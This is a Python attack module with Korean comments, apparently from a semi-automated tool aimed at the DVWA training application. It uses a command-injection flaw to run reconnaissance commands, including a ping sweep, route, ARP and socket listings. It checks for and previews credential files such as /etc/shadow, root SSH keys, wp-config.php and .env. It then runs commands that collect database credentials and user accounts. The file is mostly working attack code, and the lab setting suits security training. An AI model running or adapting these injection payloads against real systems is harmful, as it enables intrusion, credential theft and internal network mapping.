"""
Pivoting and Data Exfiltration Module
피버팅 및 중요 데이터 탈취 모듈 (반자동화)
"""

import time
import os
from utils.logger import log_attack

# 중요 파일 탐색 대상
SENSITIVE_FILES = {
    'config_files': [
        '/var/www/html/config.php',
        '/var/www/html/wp-config.php',
        '/etc/apache2/apache2.conf',
        '/etc/nginx/nginx.conf',
        '/etc/mysql/my.cnf',
        '/var/www/.env',
    ],
    'credential_files': [
        '/etc/shadow',
        '/etc/passwd',
        '/root/.ssh/id_rsa',
        '/root/.ssh/authorized_keys',
        '/home/*/.ssh/id_rsa',
        '/var/www/.git/config',
    ],
    'history_files': [
        '/root/.bash_history',
        '/home/*/.bash_history',
        '/root/.mysql_history',
    ],
    'database_dumps': [
        '/var/www/html/backup.sql',
        '/tmp/*.sql',
        '/var/backups/*.sql',
    ],
    'application_logs': [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/auth.log',
        '/var/log/syslog',
    ],
}

# 네트워크 피버팅 명령어
PIVOTING_COMMANDS = {
    'network_discovery': [
        'ip addr show',
        'ip route show',
        'arp -a',
        'cat /etc/hosts',
        'cat /etc/resolv.conf',
    ],
    'internal_scan': [
        'for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "bytes from"; done',
        'netstat -antup | grep ESTABLISHED',
        'ss -tulpn',
    ],
    'port_forwarding_check': [
        'cat /proc/sys/net/ipv4/ip_forward',
        'iptables -L -n -v',
    ],
}

def run_attack(session, delay=1):
    """
    피버팅 및 데이터 탈취 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {
            'sensitive_files': [],
            'network_info': [],
            'exfiltrated_data': []
        }
    }

    print("\n  [*] ===========================================")
    print("  [*] 피버팅 및 데이터 탈취 단계 시작")
    print("  [*] ===========================================\n")

    # 1단계: 네트워크 정보 수집
    print("  [1/3] 네트워크 정보 수집 중...")
    network_results = collect_network_info(session, delay)
    results['attempts'] += network_results['attempts']
    results['successful'] += network_results['successful']
    results['findings']['network_info'] = network_results['findings']

    # 2단계: 중요 파일 탐색
    print("\n  [2/3] 중요 파일 탐색 중...")
    file_results = search_sensitive_files(session, delay)
    results['attempts'] += file_results['attempts']
    results['successful'] += file_results['successful']
    results['findings']['sensitive_files'] = file_results['findings']

    # 3단계: 데이터 탈취 시뮬레이션
    print("\n  [3/3] 데이터 탈취 시도 중...")
    exfil_results = attempt_data_exfiltration(session, delay)
    results['attempts'] += exfil_results['attempts']
    results['successful'] += exfil_results['successful']
    results['findings']['exfiltrated_data'] = exfil_results['findings']

    if results['successful'] > 0:
        results['success'] = True

    print_pivoting_summary(results)
    return results

def collect_network_info(session, delay):
    """네트워크 정보 수집"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    print("    [*] 내부 네트워크 탐색 중...")

    for category, commands in PIVOTING_COMMANDS.items():
        for cmd in commands:
            results['attempts'] += 1

            try:
                payload = f"127.0.0.1; {cmd}"
                params = {'ip': payload, 'Submit': 'Submit'}

                response = session.session.get(cmdi_url, params=params)

                if len(response.text) > 500:  # 명령어 실행 결과가 있는 경우
                    results['successful'] += 1
                    results['findings'].append({
                        'category': category,
                        'command': cmd,
                        'output_length': len(response.text)
                    })

                    log_attack(
                        'PIVOTING_RECON',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )
                    print(f"      [+] {cmd[:60]}")

                time.sleep(delay)

            except Exception as e:
                log_attack('PIVOTING_RECON', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

    return results

def search_sensitive_files(session, delay):
    """중요 파일 탐색"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    print("    [*] 민감한 파일 검색 중...")

    for category, files in SENSITIVE_FILES.items():
        print(f"      [*] {category} 검색 중...")

        for filepath in files:
            results['attempts'] += 1

            try:
                # 파일 존재 여부 확인
                check_cmd = f"test -f {filepath} && echo 'EXISTS' || echo 'NOT_FOUND'"
                payload = f"127.0.0.1; {check_cmd}"
                params = {'ip': payload, 'Submit': 'Submit'}

                response = session.session.get(cmdi_url, params=params)

                if 'EXISTS' in response.text:
                    results['successful'] += 1
                    results['findings'].append({
                        'category': category,
                        'filepath': filepath,
                        'found': True
                    })

                    log_attack(
                        'SENSITIVE_FILE_FOUND',
                        'SUCCESS',
                        f"Category: {category}, File: {filepath}",
                        response.status_code,
                        len(response.text)
                    )
                    print(f"        [+] 발견: {filepath}")

                    # 파일 내용 미리보기 (처음 5줄)
                    preview_file_content(session, filepath, delay)

                time.sleep(delay)

            except Exception as e:
                log_attack('SENSITIVE_FILE_SEARCH', 'ERROR', f"File: {filepath}, Error: {str(e)}", 0, 0)

    return results

def preview_file_content(session, filepath, delay):
    """파일 내용 미리보기"""
    try:
        cmdi_url = f"{session.base_url}/vulnerabilities/exec/"
        preview_cmd = f"head -n 5 {filepath}"
        payload = f"127.0.0.1; {preview_cmd}"
        params = {'ip': payload, 'Submit': 'Submit'}

        response = session.session.get(cmdi_url, params=params)

        if response.status_code == 200:
            log_attack(
                'FILE_PREVIEW',
                'SUCCESS',
                f"File: {filepath}",
                response.status_code,
                len(response.text)
            )
            print(f"          [i] 파일 내용 미리보기 저장됨")

        time.sleep(delay)

    except Exception as e:
        pass

def attempt_data_exfiltration(session, delay):
    """데이터 탈취 시도 (시뮬레이션)"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    print("    [*] 데이터 탈취 시뮬레이션...")
    print("    [!] 주의: 실제 데이터 전송은 수행하지 않습니다.\n")

    # 탈취 대상 데이터
    exfil_targets = [
        {
            'name': 'Database credentials',
            'command': 'cat /var/www/html/config.php | grep -E "(DB_|database)"'
        },
        {
            'name': 'User accounts',
            'command': 'cat /etc/passwd | grep -v nologin'
        },
        {
            'name': 'SSH keys',
            'command': 'find /home -name "id_rsa" 2>/dev/null'
        },
        {
            'name': 'Web application files',
            'command': 'ls -la /var/www/html'
        },
        {
            'name': 'Running processes',
            'command': 'ps aux | grep -E "(mysql|apache|nginx)"'
        },
    ]

    for target in exfil_targets:
        results['attempts'] += 1

        try:
            payload = f"127.0.0.1; {target['command']}"
            params = {'ip': payload, 'Submit': 'Submit'}

            response = session.session.get(cmdi_url, params=params)

            if len(response.text) > 500:
                results['successful'] += 1
                results['findings'].append({
                    'data_type': target['name'],
                    'command': target['command'],
                    'data_size': len(response.text)
                })

                log_attack(
                    'DATA_EXFILTRATION',
                    'SUCCESS',
                    f"Type: {target['name']}, Command: {target['command']}",
                    response.status_code,
                    len(response.text)
                )
                print(f"      [+] 수집 성공: {target['name']}")

            time.sleep(delay)

        except Exception as e:
            log_attack('DATA_EXFILTRATION', 'ERROR', f"Target: {target['name']}, Error: {str(e)}", 0, 0)

    return results

def print_pivoting_summary(results):
    """피버팅 결과 요약 출력"""
    print("\n  [*] ===========================================")
    print("  [*] 피버팅 및 데이터 탈취 결과 요약")
    print("  [*] ===========================================\n")

    print(f"  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회\n")

    findings = results['findings']

    if findings['network_info']:
        print(f"  [+] 네트워크 정보: {len(findings['network_info'])}개 수집")

    if findings['sensitive_files']:
        print(f"  [+] 민감한 파일: {len(findings['sensitive_files'])}개 발견")
        for file_info in findings['sensitive_files'][:5]:
            print(f"      - {file_info['filepath']}")

    if findings['exfiltrated_data']:
        print(f"  [+] 탈취 데이터: {len(findings['exfiltrated_data'])}개 타입")
        for data_info in findings['exfiltrated_data']:
            print(f"      - {data_info['data_type']}")

    print()
